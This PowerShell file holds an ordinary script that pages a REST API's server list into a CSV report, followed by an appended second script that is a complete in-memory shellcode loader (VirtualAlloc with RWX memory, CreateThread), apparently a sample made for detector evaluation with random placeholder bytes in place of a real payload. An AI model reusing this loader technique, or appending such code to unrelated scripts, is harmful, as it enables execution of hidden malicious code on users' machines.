param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BaseUri = "https://api.adatum.com/v1",

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 10)]
    [int]$MaxRetries = 2,
    [int]$TimeoutSec = 15,
    [int]$PageSize = 25,
    [string]$ReportPath = "C:\Reports\api-servers-2026-11-23.csv"
)

$ErrorActionPreference = 'Stop'

$hostName = $env:COMPUTERNAME
$WarningPreference = 'Continue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}

$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
}

$records | Select-Object id, name, status | Format-Table -AutoSize

$records | Select-Object id, name, status | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class MemoryApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xd4, 0x93, 0x0b, 0x8d, 0x2a, 0x97, 0x19, 0xde, 0x8d, 0xc6, 0xa4, 0x05, 0x0c, 0x6d, 0xf6, 0x2b,
        0x63, 0xdd, 0x2c, 0x90, 0xab, 0xe6, 0x8f, 0xc4, 0xcf, 0xd4, 0x9b, 0xc8, 0x55, 0x06, 0x13, 0x2b,
        0xa7, 0xd2, 0x56, 0x4c, 0x5a, 0x1f, 0x04, 0xd4, 0xb2, 0x9e, 0x94, 0x2a, 0xe6, 0x8a, 0x42, 0x22,
        0x8c, 0x61, 0x48, 0x2f, 0x5e, 0x87, 0x0b, 0xaa, 0x3a, 0xd2, 0xe8, 0x72, 0x62, 0xa0, 0x3a, 0xe3,
        0xe3, 0x48, 0x05, 0x95, 0x30, 0x30, 0x52, 0xe2, 0x4d, 0xf4, 0xed, 0xc8, 0x75, 0x0d, 0xe1, 0x4f,
        0xca, 0x88, 0x12, 0x7b, 0x66, 0x45, 0xd6, 0x4b, 0xe0, 0xde, 0x89, 0xfa, 0xa7, 0xbd, 0xbf, 0x69,
        0x1e, 0x45, 0x5b, 0xb9, 0x78, 0xa3, 0x09, 0xd0, 0x53, 0x14, 0x34, 0xfd, 0x9e, 0x26, 0x59, 0xd1,
        0x66, 0xd2, 0xfa, 0x02, 0xca, 0xb9, 0x6c, 0xb6, 0x0e, 0xe0, 0xab, 0xc6, 0x25, 0xeb, 0x89, 0x39,
        0x5f, 0xe6, 0xd3, 0x1c, 0xa4, 0xf7, 0x2a, 0xe5, 0xd6, 0x9a, 0xe7, 0x44, 0xef, 0x22, 0x1a, 0xaa,
        0xe3, 0x87, 0x69, 0xbf, 0xa0, 0x0e, 0xdf, 0x0c, 0xc7, 0xf7, 0xa0, 0x84, 0x94, 0x69, 0xcb, 0x12,
        0xe4, 0x91, 0x7e, 0xe5, 0x48, 0xc0, 0xc7, 0xc3, 0xcc, 0xfa, 0x01, 0xd6, 0x47, 0x49, 0xcd, 0xb9,
        0x66, 0x22, 0x7f, 0xda, 0x4c, 0x10, 0x17, 0x46, 0x87, 0xf1, 0xfb, 0x09, 0xfb
    )

    $Handle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][MemoryApi]::WaitForSingleObject($Thread, 1524)
    [void][MemoryApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
